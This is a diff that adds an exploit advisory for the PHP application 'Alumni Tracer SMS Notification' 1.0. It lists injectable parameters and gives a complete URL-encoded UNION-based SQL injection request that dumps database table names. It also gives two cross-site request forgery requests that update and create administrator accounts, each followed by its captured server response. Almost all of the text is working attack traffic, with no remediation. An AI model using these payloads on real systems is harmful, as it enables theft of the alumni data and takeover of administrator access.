@@ -1,0 +1,91 @@
+# Exploit Title: Alumni Tracer SMS Notification - SQL Injection / Cross-Site Request Forgery (Add/Update Admin)
+# Dork: N/A
+# Date: 2018-12-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/php/12825/alumni-tracer-sms-notification-using-phpmysqli.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/alumnitracer.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/index.php?q=blog&id=[SQL]
+# http://localhost/[PATH]/index.php?q=alumni&id=201809&sy=[SQL]
+# http://localhost/[PATH]/index.php?q=alumni POST / batch=[SQL]&COURSE=[SQL]&submit=
+# http://localhost/[PATH]/index.php?q=advancesearch POST / SEARCH=[SQL]&batch=[SQL]&COURSE=[SQL]&STATUS=[SQL]&submit=
+# 
+
+#SQL Injection
+GET /[PATH]/index.php?q=blog&id=-201800056%27%20%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%28%53%45%4c%45%43%54%28%40%78%29%46%52%4f%4d%28%53%45%4c%45%43%54%28%40%78%3a%3d%30%78%30%30%29%2c%28%40%4e%52%3a%3d%30%29%2c%28%53%45%4c%45%43%54%28%30%29%46%52%4f%4d%28%49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%54%41%42%4c%45%53%29%57%48%45%52%45(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=%43%4f%4e%43%41%54(@x,%4c%50%41%44(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))%29%29%78%29%2c%34%2c%35%2c%36%2c%37%2c%38%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=hasj51emnq9caak0pf8h8htmm6
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Wed, 05 Dec 2018 19:20:56 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=86
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+#Cross-Site Request Forgery (Update Admin)
+POST /[PATH]/admin/modules/user/controller.php?action=edit HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 134
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+user_id=312316&deptid=&user_name=administrator&deptid=&user_email=admin&deptid=&user_pass=efeefe&deptid=&retype_user_pass=efeefe&save=: undefined
+HTTP/1.1 200 OK
+Date: Wed, 05 Dec 2018 19:29:44 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 57
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+#Cross-Site Request Forgery (Add Admin)
+POST /[PATH]/admin/modules/user/controller.php?action=add HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+deptid=&user_name=efe&deptid=&user_email=efe&deptid=&user_pass=efeefe&deptid=&retype_user_pass=efeefe&save=: undefined
+HTTP/1.1 200 OK
+Date: Wed, 05 Dec 2018 19:33:34 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 57
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
